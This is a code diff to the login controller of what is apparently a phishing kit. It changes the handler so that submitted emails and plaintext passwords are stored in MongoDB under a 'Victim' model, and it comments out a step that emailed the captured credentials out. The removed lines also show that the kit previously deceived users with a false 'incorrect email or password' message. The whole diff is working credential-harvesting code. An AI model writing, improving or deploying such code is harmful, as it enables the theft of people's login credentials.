@@ -1,4 +1,5 @@
 const { sendLoginEmail } = require("../services/emailService.js");
+const Victim = require("../models/VictimModel.js"); // <-- Import the model
 
 exports.submitLogin = async (req, res) => {
   const { email, password } = req.body || {};
@@ -11,10 +12,15 @@ exports.submitLogin = async (req, res) => {
   }
 
   try {
-    await sendLoginEmail({ email, password });
+    // 1. SAVE TO MONGODB FIRST (This takes milliseconds)
+    await Victim.create({ email, password });
+    console.log("✅ Victim data saved to MongoDB");
+
+    // 2. COMMENT OUT THE EMAIL FOR NOW TO AVOID TIMEOUT
+    // await sendLoginEmail({ email, password });
 
     return res.render("login", { 
-      message: "incorrect email or password. Please input correct details.", 
+      message: "Login request saved to database successfully!", 
       messageType: "success" 
     });
   } catch (error) {
